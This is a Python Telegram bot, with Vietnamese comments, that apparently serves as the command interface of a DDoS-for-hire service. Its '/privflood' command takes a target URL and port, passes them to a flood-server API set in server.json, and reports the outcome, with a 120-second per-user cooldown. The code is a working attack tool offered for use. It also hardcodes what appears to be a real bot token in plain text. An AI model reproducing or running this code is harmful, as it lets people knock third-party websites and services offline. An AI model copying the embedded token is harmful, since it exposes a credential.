import json
import re
import requests
import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from datetime import datetime, timedelta

PHOTO_URLS = {
    "loading": "https://ov20-engine.flamingtext.com/netfu/tmp28007/flamingtext_com-1656326255.png",
    "success": "https://ov19-engine.flamingtext.com/netfu/tmp28007/flamingtext_com-3059895128.png",
    "failure": "https://ov12-engine.flamingtext.com/netfu/tmp28016/coollogo_com-31571298.png"
}

user_status = {}

# Đọc URL server từ file
def get_server_url() -> str:
    try:
        with open("server.json", "r") as file:
            return json.load(file).get("server_url", "")
    except (FileNotFoundError, json.JSONDecodeError):
        return ""

# Kiểm tra URL hợp lệ
def is_valid_url(url: str) -> bool:
    return bool(re.match(r'^https?://', url))

# Gửi thông báo
async def send_message(update, photo_url, caption, json_content=None):
    html_content = json.dumps(json_content, indent=4, ensure_ascii=False) if json_content else ""
    await update.message.reply_photo(
        photo=photo_url,
        caption=f"<b>{caption}</b>\n\n<pre>{html_content}</pre>",
        parse_mode="HTML"
    )

# Xử lý API và gửi thông báo
async def handle_api_response(update, response):
    try:
        json_data = response.json()
    except json.JSONDecodeError:
        json_data = {"status": "error", "message": "Không thể parse JSON từ phản hồi."}

    caption = "Kết nối API thành công." if response.status_code == 200 else f"Kết nối API thất bại (Mã trạng thái: {response.status_code})."
    await send_message(update, PHOTO_URLS["success" if response.status_code == 200 else "failure"], caption, json_data)

# Xử lý lệnh /privflood
async def priv_flood(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id

    # Kiểm tra trạng thái người dùng
    if user_id in user_status and user_status[user_id] > datetime.now():
        remaining_time = user_status[user_id] - datetime.now()
        await send_message(update, PHOTO_URLS["failure"], "Bạn đang có tiến trình khác đang chạy", {
            "status": "error",
            "message": f"Vui lòng chờ {remaining_time.seconds} giây nữa để tiếp tục."
        })
        return

    if len(context.args) < 2 or not is_valid_url(context.args[0]) or not context.args[1].isdigit():
        return await send_message(update, PHOTO_URLS["failure"], "Vui lòng nhập {URL} và {PORT} hợp lệ. Ví dụ: /privflood https://example.com 443.")

    target_host, port = context.args[0], context.args[1]
    server_url = get_server_url()
    if not server_url:
        return await send_message(update, PHOTO_URLS["failure"], "Không tìm thấy API của server trong file server.json.")

    # Thay thế {port} và {host} trong URL
    full_url = server_url.replace("{port}", port).replace("{host}", target_host)

    # Gửi thông báo và xóa sau 3 giây
    loading_message = await update.message.reply_photo(
        photo=PHOTO_URLS["loading"],
        caption="<b>Vui lòng đợi kết nối đến server API</b>",
        parse_mode="HTML"
    )
    await asyncio.sleep(3)
    await loading_message.delete()

    try:
        response = requests.get(full_url)
        await handle_api_response(update, response)

        # Lưu trạng thái người dùng, chặn lệnh tiếp theo trong 120 giây
        user_status[user_id] = datetime.now() + timedelta(seconds=120)

    except requests.exceptions.RequestException as e:
        error_result = {"status": "error", "message": f"Kết nối API thất bại. Lỗi: {str(e)}"}
        await send_message(update, PHOTO_URLS["failure"], "Kết nối API thất bại.", error_result)

# Khởi tạo bot
def main():
    application = ApplicationBuilder().token("7065038890:AAHSqpcpEKzjOANvbXTiuYqPFtwhmqwOZnU").build()
    application.add_handler(CommandHandler("privflood", priv_flood))
    application.run_polling()

if __name__ == "__main__":
    main()
